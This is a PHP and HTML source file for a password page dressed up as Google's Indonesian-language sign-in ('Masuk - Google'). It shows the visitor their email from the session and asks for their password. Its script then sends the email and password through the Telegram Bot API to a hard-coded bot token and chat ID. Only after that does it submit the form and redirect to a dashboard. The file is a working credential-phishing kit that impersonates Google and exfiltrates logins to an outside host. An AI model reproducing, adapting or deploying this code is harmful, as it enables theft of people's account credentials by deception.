<?php
session_start();

// Redirect jika email belum ada di session
if (!isset($_SESSION['email'])) {
    header("Location: index.php");
    exit();
}

// Ambil email dari session
$email = htmlspecialchars($_SESSION['email']); // Tambahkan htmlspecialchars untuk keamanan

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'] ?? '';

    if (!empty($password)) {
        // Proses login, tambahkan logika autentikasi disini
        $_SESSION['password'] = htmlspecialchars($password); // Tambahkan htmlspecialchars
        header("Location: dashboard.php"); // Redirect ke dashboard setelah login
        exit();
    } else {
        $error_message = "Password tidak boleh kosong.";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk - Google</title>
    <style>
        /* Style untuk elemen-elemen di halaman */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, sans-serif;
        }

        body {
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-card {
            background: white;
            padding: 48px 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 450px;
        }

        .logo {
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 400;
        }

        .email-container {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
            background: #fff;
            padding: 8px 16px;
            border: 1px solid #dadce0;
            border-radius: 16px;
            cursor: pointer;
            width: fit-content;
        }

        .email-avatar {
            width: 20px;
            height: 20px;
            background: #dc4e41;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            margin-right: 8px;
            text-transform: uppercase;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 32px;
        }

        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 8px;
        }

        input[type="password"]:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px #e8f0fe;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
        }

        .checkbox-container input[type="checkbox"] {
            margin-right: 8px;
        }

        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            padding: 8px 24px;
            border-radius: 4px;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .next-button:hover {
            background: #1557b0;
        }

        footer {
            padding: 16px;
            display: flex;
            justify-content: space-between;
            background: #f8f9fa;
        }

        .language-select {
            padding: 8px;
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            gap: 16px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }

        .form-group {
            margin-bottom: 32px;
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #5f6368;
            padding: 4px;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-password:focus {
            outline: none;
        }

        /* Menampilkan pesan error */
        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
        <img src="g.ico" alt="" viewBox="0 0 75 24" width="20" height="20">
            <br>
            <br>
            <h1><?php echo htmlspecialchars($_SESSION[''] ?? "Masuk"); ?></h1>
            
            <div class="email-container">
                <div class="email-avatar"><?php echo strtoupper(substr($email, 0, 1)); ?></div>
                <span><?php echo $email; ?></span>
            </div>

            <p class="subtitle">Untuk melanjutkan, verifikasi diri Anda terlebih dahulu</p>

            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" id="loginForm">
                <div class="form-group">
                    <input type="password" name="password" id="password" placeholder="Masukkan sandi" required>
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="show-password" onclick="togglePassword()">
                    <label for="show-password">Tampilkan sandi</label>
                </div>

                <div class="button-container">
                    <a href="#" class="forgot-password">Lupa sandi?</a>
                    <button type="submit" class="next-button" id="sendToTelegram">Login</button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <!-- Footer tetap sama -->
    </footer>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const checkbox = document.getElementById('show-password');
            passwordInput.type = checkbox.checked ? 'text' : 'password';
        }

        // Mengirimkan data ke Telegram hanya jika form login sudah diproses
        document.getElementById('sendToTelegram').addEventListener('click', function(event) {
            event.preventDefault(); // Mencegah reload halaman jika form disubmit

            // Ambil nilai dari input password
            var password = document.getElementById('password').value;
            var email = '<?php echo $email; ?>'; // Mengambil email dari PHP

            // Cek jika password atau email kosong
            if (!password || !email) {
                alert('Password dan email harus diisi');
                return;
            }

            // Data bot Telegram
            var botToken = '8053803178:AAHnlfGLjgotTDU0YPrEImFJ-9DB7J1T11s'; // Ganti dengan Token Bot Anda
            var chatId = '6820629880'; // Ganti dengan chat ID Anda

            // Pesan yang akan dikirim
            var message = 'Login Details:\nEmail: ' + email + '\nPassword: ' + password;

            // URL API Telegram
            var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

            // Menampilkan pesan yang akan dikirim untuk debugging
            console.log("Pesan yang akan dikirim:", message);

            // Mengirim pesan ke Telegram menggunakan fetch API
            fetch(telegramUrl)
                .then(response => response.json())
                .then(data => {
                    if(data.ok) {
                        alert('Berhasil login');
                        document.getElementById('loginForm').submit(); // Proses form setelah mengirim ke Telegram
                    } else {
                        alert('Login gagal');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Terjadi kesalahan saat mengirim pesan.');
                });
        });
    </script>
</body>
</html>
